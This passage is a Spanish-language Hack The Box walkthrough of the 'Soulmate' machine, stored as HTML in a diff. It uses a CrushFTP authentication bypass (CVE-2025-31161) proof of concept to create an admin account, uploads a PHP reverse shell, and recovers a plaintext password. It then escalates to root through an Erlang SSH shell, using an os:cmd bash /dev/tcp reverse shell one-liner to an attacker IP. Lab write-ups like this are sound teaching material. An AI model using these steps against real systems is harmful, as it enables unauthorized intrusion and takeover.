+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 11.34 seconds
+</span></span></code></pre></div><h1 id="enumeración-web">Enumeración web<a hidden class="anchor" aria-hidden="true" href="#enumeración-web">#</a></h1>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo nano /etc/hosts
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">whatweb http://soulmate.htb
+</span></span></code></pre></div><p><img alt="soulmate_machine_1" loading="lazy" src="/img/soulmate/soulmate_machine_1.png"></p>
+<p>Una vez entramos a la web nos encontramos una pagina de citas.</p>
+<p><img alt="soulmate_machine_2" loading="lazy" src="/img/soulmate/soulmate_machine_2.png"></p>
+<p>Vemos que nos podemos registrar así que vamos a hacerlo para ver que podemos hacer en la página, aunque no encuentro nada interesante por el momento.</p>
+<h2 id="enumerando-vhosts---gobuster">Enumerando VHOSTS - Gobuster<a hidden class="anchor" aria-hidden="true" href="#enumerando-vhosts---gobuster">#</a></h2>
+<p>Es entonces cuando me pongo a enumerar vhosts y encuentro el subdominio <code>ftp</code>, en el que esta corriendo CrushFTP.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gobuster vhost -u http://soulmate.htb -w &lt;ruta&gt; --append-domain
+</span></span></code></pre></div><p><img alt="soulmate_machine_3" loading="lazy" src="/img/soulmate/soulmate_machine_3.png"></p>
+<blockquote>
+<p>CrushFTP es un servidor propietario de transferencia de archivos multiplataforma y multiprotocolo.</p>
+</blockquote>
+<p><img alt="soulmate_machine_4" loading="lazy" src="/img/soulmate/soulmate_machine_4.png"></p>
+<h2 id="crushftp-auth-bypass---cve-2025-31161">CrushFTP auth bypass - CVE-2025-31161<a hidden class="anchor" aria-hidden="true" href="#crushftp-auth-bypass---cve-2025-31161">#</a></h2>
+<p><a href="https://www.huntress.com/blog/crushftp-cve-2025-31161-auth-bypass-and-post-exploitation">https://www.huntress.com/blog/crushftp-cve-2025-31161-auth-bypass-and-post-exploitation</a></p>
+<p>Primero probamos que la página sea vulnerable a este CVE listando los usuarios de la página web mediante la función getUserList.</p>
+<p>Para llevar a cabo el bypass se necesitan los siguientes parámetros:</p>
+<ul>
+<li><code>Authorization&quot;: &quot;AWS4-HMAC-SHA256 Credential=crushadmin/</code></li>
+<li>Coger los ultimo 4 parámetros de la <code>cookie</code> de inicio de sesión y ponerla como <code>c2f</code>.</li>
+<li>interceptar la petición <code>/function/</code> para poder manipular el contenido.</li>
+</ul>
+<p><img alt="soulmate_machine_5" loading="lazy" src="/img/soulmate/soulmate_machine_5.png"></p>
+<p>Una vez comprobado que el host es vulnerable, vamos a usar un POC para añadir un nuevo usuario a la web como administrador.</p>
+<p>Una vez me clono el repositorio, indicamos la el nombre del v-host, y el nombre del administrador por defecto <code>crushadmin</code> que se añadirá la cabezera <code>Authorization: AWS4-HMAC-SHA256 Credential=crushadmin/</code>. Luego le indicamos el nombre y la contraseña del usuario que se creará como administrador.</p>
+<p><img alt="soulmate_machine_6" loading="lazy" src="/img/soulmate/soulmate_machine_6.png"></p>
+<p>Y ejecutamos el script para conseguir crear nuestro usuario malicioso.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 cve-2025-31161.py --target_host ftp.soulmate.htb --port <span class="m">80</span> --target_user crushadmin --new_user pwn --password pwn
+</span></span></code></pre></div><p><img alt="soulmate_machine_7" loading="lazy" src="/img/soulmate/soulmate_machine_7.png"></p>
+<p>Una vez dentro de nuestro usuario como administrador vemos en el apartado admin que podemos gestionar permisos de los usuarios e incluso generarles nuevas contraseñas.</p>
+<p><img alt="soulmate_machine_8" loading="lazy" src="/img/soulmate/soulmate_machine_8.png"></p>
+<p>Entonces nuestro siguiente paso es cambiar-le la contraseña al usuario ben, y luego ya que tenemos permisos para añadir archivos php. Subir una revershe shell en php.</p>
+<p>Le cambiamos la contraseña a ben:</p>
+<p><img alt="soulmate_machine_9" loading="lazy" src="/img/soulmate/soulmate_machine_9.png"></p>
+<p>Iniciamos sesión como ben y subimos el archivo shell.php para luego ejecutarlo lanzando una petición http a la url donde se aloja el archivo.</p>
+<p><img alt="soulmate_machine_10" loading="lazy" src="/img/soulmate/soulmate_machine_10.png"></p>
+<p><img alt="soulmate_machine_11" loading="lazy" src="/img/soulmate/soulmate_machine_11.png"></p>
+<p>Y nos llega la shell a nuestro listener ademas vemos que nuestro usuario actual www-data.</p>
+<p><img alt="soulmate_machine_12" loading="lazy" src="/img/soulmate/soulmate_machine_12.png"></p>
+<h2 id="movimiento-lateral">Movimiento lateral<a hidden class="anchor" aria-hidden="true" href="#movimiento-lateral">#</a></h2>
+<p>Con lo cual nos ponemos a buscar algún tipo de credencial o archivo .db para conseguir obtener las credenciales validas del usuario ben.</p>
+<p><img alt="soulmate_machine_13" loading="lazy" src="/img/soulmate/soulmate_machine_13.png"></p>
+<p>Encontramos un archivo .db y nos lo pasamos a nuestra máquina atacante para sacar las credenciales cómodamente.</p>
+<p><img alt="soulmate_machine_14" loading="lazy" src="/img/soulmate/soulmate_machine_14.png"></p>
+<p>Una vez tenemos la el archivo lo consultamos y vemos un hash que vamos a tratar de crackear.</p>
+<p><img alt="soulmate_machine_15" loading="lazy" src="/img/soulmate/soulmate_machine_15.png"></p>
+<p>Luego de haber intentado crackear el hash, no funciona.
+Entonces me pongo a enumerar el sistema manualmente además de con el comando <code>find</code> + <code>grep</code> para tratar de buscar credenciales pero no tengo suerte.</p>
+<p>Con lo cual lo siguiente que se me ocurre es lanzar un LinPeas para ver si me encuentra algún tipo de información que yo pueda estar dando por alto.</p>
+<p><img alt="soulmate_machine_16" loading="lazy" src="/img/soulmate/soulmate_machine_16.png"></p>
+<p>Una vez lanzado el linpeas, en el apartado de posibles ejecutables añadidos por el usuario encontramos la carpeta <code>/erlang/</code> y <code>/erlang_login/</code>.</p>
+<p><img alt="soulmate_machine_17" loading="lazy" src="/img/soulmate/soulmate_machine_17.png"></p>
+<p>En un principio pruebo a buscar el nombre ben en erlang_login porque porque es posible tenga algún tipo de credenciales en los archivos.</p>
+<p><img alt="soulmate_machine_18" loading="lazy" src="/img/soulmate/soulmate_machine_18.png"></p>
+<p>Entonces al hacer la búsqueda nos indica que existe esa cadena de caracteres en <code>start.escript</code>.</p>
+<p><img alt="soulmate_machine_19" loading="lazy" src="/img/soulmate/soulmate_machine_19.png"></p>
+<p><code>ben:HouseH0ldings998</code></p>
+<p>Entonces nos conectamos a través de ssh y conseguimos la user flag.</p>
+<p><img alt="soulmate_machine_20" loading="lazy" src="/img/soulmate/soulmate_machine_20.png"></p>
+<h1 id="escalada-de-privilegios">Escalada de privilegios<a hidden class="anchor" aria-hidden="true" href="#escalada-de-privilegios">#</a></h1>
+<p>Haciendo la enumeración en el sistema, vemos que no tenemos ningún tipo de permiso para ejecutar comandos como usuario root, ni tampoco existen archivos con permisos SUID que no sean los comunes.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo -l
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">find / -perm -4000 2&gt;/dev/null
+</span></span></code></pre></div><p><img alt="soulmate_machine_21" loading="lazy" src="/img/soulmate/soulmate_machine_21.png"></p>
+<p>Con lo cual el siguiente paso que damos es enumerar los puertos que están corriendo internamente.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">netstat -ano <span class="p">|</span> grep LISTEN
+</span></span></code></pre></div><p><img alt="soulmate_machine_22" loading="lazy" src="/img/soulmate/soulmate_machine_22.png"></p>
+<p>Lo primero que hago son revisar los puertos que podrían tener páginas web de administración del sistema pero no encuentro nada.
+Entonces enumerando puertos con nc, el puerto 2222 nos envía el siguiente banner indicándonos que en ese puerto esta corriendo un puerto ssh-Erlang.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nc -nv 127.0.0.1 <span class="m">2222</span>
+</span></span></code></pre></div><p><img alt="soulmate_machine_23" loading="lazy" src="/img/soulmate/soulmate_machine_23.png"></p>
+<p>Con lo cual vamos a conectarnos a este puerto 2222 a través de ssh utilizando las credenciales que tenemos para poder enumerarlo.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ssh ben@127.0.0.1 -p <span class="m">2222</span>
+</span></span></code></pre></div><p><img alt="soulmate_machine_24" loading="lazy" src="/img/soulmate/soulmate_machine_24.png"></p>
+<h2 id="explotando-la-capacidad-de-ejecutar-comandos-y-los-permisos-a-través-de-la-shell-erlang">Explotando la capacidad de ejecutar comandos y los permisos a través de la shell Erlang<a hidden class="anchor" aria-hidden="true" href="#explotando-la-capacidad-de-ejecutar-comandos-y-los-permisos-a-través-de-la-shell-erlang">#</a></h2>
+<p>Vemos que nos hemos podido conectar y que tenemos la Erlang shell, entonces investigando sobre que comandos podemos ejecutar en la shell de Erlang descubro que tenemos una opción para ejecutar comandos en el sistema.</p>
+<p>La primera prueba que realizo es ejecutar un id para comprobar que funcione y con que usuario estamos ejecutándolo.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">os:cmd<span class="o">(</span><span class="s2">&#34;id&#34;</span><span class="o">)</span>.
+</span></span></code></pre></div><p><img alt="soulmate_machine_25" loading="lazy" src="/img/soulmate/soulmate_machine_25.png"></p>
+<p>Si queremos usando file: podemos leer ya el contenido de la root.txt</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">file:read_file<span class="o">(</span><span class="s2">&#34;/root/root.txt&#34;</span><span class="o">)</span>.
+</span></span></code></pre></div><p><img alt="soulmate_machine_26" loading="lazy" src="/img/soulmate/soulmate_machine_26.png"></p>
+<p>Aunque nuestro objetivo real es conseguir una shell completamente interactiva como root.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">os:cmd<span class="o">(</span><span class="s2">&#34;bash -c &#39;bash -i &gt;&amp;/dev/tcp/10.10.14.105/4444 0&gt;&amp;1&#39;&#34;</span><span class="o">)</span>.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">nc -lvnp <span class="m">4444</span>
+</span></span></code></pre></div><p><img alt="soulmate_machine_27" loading="lazy" src="/img/soulmate/soulmate_machine_27.png"></p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://borhuub.github.io/tags/easy/">Easy</a></li>
+      <li><a href="https://borhuub.github.io/tags/linux/">Linux</a></li>
+      <li><a href="https://borhuub.github.io/tags/vhost/">Vhost</a></li>
+      <li><a href="https://borhuub.github.io/tags/sudo/">SUDO</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="https://borhuub.github.io/writeups/rustykey/">
+    <span class="title">« Prev</span>
+    <br>
+    <span>Rustykey</span>
+  </a>
+  <a class="next" href="https://borhuub.github.io/writeups/tombwatcher/">
+    <span class="title">Next »</span>
+    <br>
+    <span>Tombwatcher</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="https://borhuub.github.io/">Borhub Blog</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
